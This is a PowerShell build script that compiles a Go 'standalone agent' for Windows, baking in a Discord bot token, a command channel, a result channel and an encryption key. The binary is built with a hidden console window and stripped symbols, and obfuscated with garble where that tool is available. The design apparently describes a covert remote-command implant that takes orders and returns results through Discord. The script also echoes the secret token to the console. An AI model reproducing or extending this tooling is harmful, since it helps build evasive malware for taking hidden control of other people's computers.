
$localTmp = Join-Path $PSScriptRoot "tmp"
if (-not (Test-Path $localTmp)) {
    New-Item -ItemType Directory -Path $localTmp | Out-Null
}
$env:GOTMPDIR = $localTmp
Write-Host "Using local build cache: $localTmp" -ForegroundColor Gray

$envFile = ".env"

if (-not (Test-Path $envFile)) {
    Write-Error ".env file not found! Please configure it first."
    exit 1
}


$envContent = Get-Content $envFile
$vars = @{}
foreach ($line in $envContent) {
    if ($line -match "^(.*?)=(.*)$") {
        $key = $matches[1].Trim()
        $value = $matches[2].Trim()
        $vars[$key] = $value
    }
}

$Token = $vars["DISCORD_TOKEN"]
$CmdCh = $vars["COMMAND_CHANNEL_ID"]
$ResCh = $vars["RESULT_CHANNEL_ID"]
$Key   = $vars["ENCRYPTION_KEY"]

if (-not $Token -or -not $CmdCh -or -not $ResCh -or -not $Key) {
    Write-Error "Missing variables in .env file."
    exit 1
}

Write-Host "Building Standalone Agent..." -ForegroundColor Cyan
Write-Host "Token: $Token" -ForegroundColor DarkGray
Write-Host "CmdCh: $CmdCh" -ForegroundColor DarkGray
Write-Host "ResCh: $ResCh" -ForegroundColor DarkGray


$env:GOOS = "windows"
$env:GOARCH = "amd64"


$ldflags = "-s -w -H=windowsgui -X main.Token=$Token -X main.CommandChannel=$CmdCh -X main.ResultChannel=$ResCh -X main.KeyString=$Key"


if (Get-Command garble -ErrorAction SilentlyContinue) {
    Write-Host "Obfuscating with Garble (Optimized for speed)..." -ForegroundColor Yellow
    
    garble build -ldflags $ldflags -o bin/agent_standalone.exe ./cmd/agent
} else {
    Write-Host "Garble not found. Building with standard go build..." -ForegroundColor Yellow
    go build -ldflags $ldflags -o bin/agent_standalone.exe ./cmd/agent
}

if ($LASTEXITCODE -eq 0) {
    Write-Host "Success! Standalone binary created at bin/agent_standalone.exe" -ForegroundColor Green
} else {
    Write-Error "Build failed."
}
